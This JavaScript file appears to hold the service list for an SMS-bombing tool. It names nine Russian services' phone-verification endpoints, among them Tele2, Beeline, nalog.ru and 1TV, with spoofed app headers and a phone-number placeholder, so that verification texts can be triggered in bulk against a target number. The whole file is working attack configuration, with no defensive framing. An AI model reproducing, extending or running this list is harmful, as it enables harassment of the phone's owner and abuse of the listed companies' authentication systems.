// База сервисов, вытянутая из твоего sms.kt
const ServiceManager = {
    getServices: function() {
        return [
            {
                name: "T2 (Tele2)",
                url: "https://api.t2.ru/api/validation/number/%phone%",
                method: "POST",
                headers: {
                    "X-API-Version": "1",
                    "Tele2-User-Agent": '"mytele2-app/6.30.0";"iPhone14";"iOS/26.1"',
                    "User-Agent": "tele2-selfcare/6992 CFNetwork/3860.200.71 Darwin/25.1.0"
                },
                body: { "sender": "Tele2" }
            },
            {
                name: "Beeline SMS",
                url: "https://cdn.beeline.ru/app/inventory/v1/person/send-sms-code/",
                method: "POST",
                headers: { "Referer": "https://cdn.beeline.ru/phone-verify" },
                body: { "phone": "+%phone%" }
            },
            {
                name: "VkusVill",
                url: "https://mobile.vkusvill.ru/api/user/preGenerateVirtualCard/",
                method: "POST",
                headers: {
                    "X-VKUSVILL-SOURCE": "6",
                    "User-Agent": "vkusvill/26.1.7 (Android; 33)"
                },
                body: "number=%phone%"
            },
            {
                name: "4Lapy",
                url: "https://4lapy.ru/api/auth/newCode/",
                method: "POST",
                headers: { "Origin": "https://4lapy.ru" },
                body: { "phone": "%phone%" }
            },
            {
                name: "SvoeFermerstvo",
                url: "https://svoefermerstvo.ru/api/ext/rshb-auth/send-verification-code-auth",
                method: "POST",
                body: { "login": "+%phone%" }
            },
            {
                name: "Nalog RU",
                url: "https://lknpd.nalog.ru/api/v2/auth/challenge/sms/start",
                method: "POST",
                body: { "phone": "%phone%", "requireTpToBeActive": false, "deviceData": { "sourceType": "WEB" } }
            },
            {
                name: "E-Dostav",
                url: "https://www.edostav.ru/api/v3/user/requestCode",
                method: "POST",
                headers: { "system": "ios", "appname": "EdostavRN" },
                body: { "phone": "%phone%" }
            },
            {
                name: "Kino 1TV",
                url: "https://api.kino.1tv.ru/1.4/sendUserCode?msisdn=%phone%&mobile=false&client=web",
                method: "GET"
            },
            {
                name: "Smotrim RU",
                url: "https://account.smotrim.ru/api/v1/auth?phone=%phone%",
                method: "GET",
                headers: { "User-Agent": "smotrim-ios/22.18" }
            }
        ];
    }
};
